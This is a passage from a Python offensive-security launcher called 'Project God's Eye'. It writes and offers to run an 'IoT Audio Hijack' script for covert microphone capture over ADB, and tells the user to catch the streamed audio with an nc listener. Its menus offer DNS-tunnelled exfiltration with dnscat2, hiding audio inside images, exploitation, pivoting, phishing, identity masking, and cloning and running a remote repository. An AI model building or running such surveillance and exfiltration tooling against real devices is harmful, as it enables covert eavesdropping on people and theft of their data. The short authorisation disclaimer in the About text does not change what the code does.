    script_path = "/tmp/godseye_iot_hijack.sh"
    with open(script_path, "w") as f:
        f.write(script)
    os.chmod(script_path, 0o755)

    print(f"  {CYAN}[*] Payload ready: {script_path}{RESET}")
    print(f"  {CYAN}[*] On your listener, run: nc -lvnp {port} > captured_audio.raw{RESET}\n")

    ans = input(f"  {BOLD}Run payload now? [y/N]: {RESET}").strip().lower()
    if ans == "y":
        open_in_terminal("IoT Audio Hijack", script_path, wait=False)

    pause()


def audio_surveillance_menu():
    options = {
        "1": ("ffmpeg", "Capture / stream audio"),
        "2": ("sox", "Lightweight audio capture"),
        "3": ("dnscat2", "DNS-tunneled data exfiltration"),
        "4": ("steghide", "Hide audio inside images / audio files"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Audio Surveillance — IoT Listening Post ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {GREEN}[P]{RESET} Run IoT Audio Hijack PoC (ADB mic capture)")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c.lower() == "p":
            run_iot_audio_payload()
        elif c == "0":
            break


# ─────────────────────────────────────────────────────────
# Integrations  — UNCHANGED
# ─────────────────────────────────────────────────────────

def integrations_menu():
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Integrations & External Tools ]{RESET}\n")
        print(f"  {GREEN}[1]{RESET} Aegis Cyber Gateway     {CYAN}->{RESET} Open Aegis portfolio in browser")
        print(f"  {GREEN}[2]{RESET} OSINT Framework          {CYAN}->{RESET} Open osintframework.com")
        print(f"  {GREEN}[3]{RESET} Shannon AI (LLM)         {CYAN}->{RESET} Clone & run Keygraph Shannon")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c == "1":
            open_url("https://aegiscybercomms.netlify.app/", "Aegis Cyber Gateway")
        elif c == "2":
            open_url("https://osintframework.com/", "OSINT Framework")
        elif c == "3":
            clone_and_run(
                "Shannon AI",
                "https://github.com/KeygraphHQ/shannon.git",
                "python3 shannon.py 2>/dev/null || python3 main.py 2>/dev/null || bash",
            )
        elif c == "0":
            break


# ─────────────────────────────────────────────────────────
# About  — UNCHANGED
# ─────────────────────────────────────────────────────────

def about():
    clear_screen()
    header()
    print(f"""  {CYAN}{"-" * 56}
  [!] PROJECT GOD'S EYE - CREDENTIALS REPORT
  {"-" * 56}{RESET}

  {BOLD}Architect{RESET}
  Vaishnav Rajeev - B.Tech Cyber Security
  Specialisation: OSINT, digital forensics, network security,Cyber espionage,Reconnaisance and Enumeration, Social Engineering,IoT and Embedded device security 
  scripting and automation,

  {BOLD}Core Contributors{RESET}
  Rishabh Gurnani - B.Tech Cyber Security
  Specialisation: Governance, risk & compliance (GRC),
  identity and multi-factor authentication

  {CYAN}{"-" * 56}
  Mission
  {"-" * 56}{RESET}
  God's Eye consolidates industry-standard reconnaissance
  and OSINT tools into a single, accessible framework for
  ethical hackers, security researchers, and defenders.

  All activities must be performed on systems you own or
  have explicit written authorisation to test.

  {CYAN}{"-" * 56}{RESET}
  {MAGENTA}Contact: vaishnav.cvv240888@cvv.ac.in{RESET}
  {CYAN}{"-" * 56}{RESET}
""")
    pause()


# ─────────────────────────────────────────────────────────
# Main menu  — UPDATED with new categories
# ─────────────────────────────────────────────────────────

def main_menu():
    while True:
        clear_screen()
        header()

        if not check_internet():
            print(f"  {RED}[!] No internet connection detected.{RESET}\n")

        print(f"  {YELLOW}[ Reconnaissance ]{RESET}")
        print(f"  {GREEN}[1]{RESET} Host OSINT        {GREEN}[2]{RESET} DNS Recon")
        print(f"  {GREEN}[3]{RESET} Web Scan          {GREEN}[4]{RESET} Web Vuln")
        print(f"  {GREEN}[5]{RESET} Wireless Audit")

        print(f"\n  {YELLOW}[ Exploitation / Post-Exploit ]{RESET}")
        print(f"  {GREEN}[6]{RESET} Exploitation      {GREEN}[7]{RESET} Post-Exploit & Pivot")
        print(f"  {GREEN}[8]{RESET} Phishing / Social Eng")

        print(f"\n  {YELLOW}[ IoT / Audio ]{RESET}")
        print(f"  {GREEN}[9]{RESET} IoT & Hardware     {GREEN}[10]{RESET} Audio Surveillance")

        print(f"\n  {YELLOW}[ Anonymity ]{RESET}")
        print(f"  {GREEN}[11]{RESET} MAC Changer       {GREEN}[12]{RESET} IP Changer")
        print(f"  {GREEN}[13]{RESET} GOD'S FIX")

        print(f"\n  {YELLOW}[ Integrations ]{RESET}")
        print(f"  {GREEN}[14]{RESET} External Tools & Integrations")

        print(f"\n  {YELLOW}[ Info ]{RESET}")
        print(f"  {GREEN}[15]{RESET} About / Authors")
        print(f"\n  {RED}[0]{RESET} Exit\n")

        c = input(f"  {BOLD}Vector: {RESET}").strip()

        routes = {
            "1": host_menu,
            "2": network_menu,
            "3": web_scan_menu,
            "4": web_vuln_menu,
            "5": wireless_menu,
            "6": exploitation_menu,
            "7": post_exploit_menu,
            "8": phishing_menu,
            "9": iot_menu,
            "10": audio_surveillance_menu,
            "11": mac_changer,
            "12": ip_changer,
            "13": gods_fix,
            "14": integrations_menu,
            "15": about,
        }

        if c in routes:
            routes[c]()
        elif c == "0":
            print(f"\n  {CYAN}[*] Session closed. Stay ethical.{RESET}\n")
            sys.exit(0)


# ─────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n  {YELLOW}[!] Interrupted. Exiting cleanly.{RESET}\n")
        sys.exit(0)
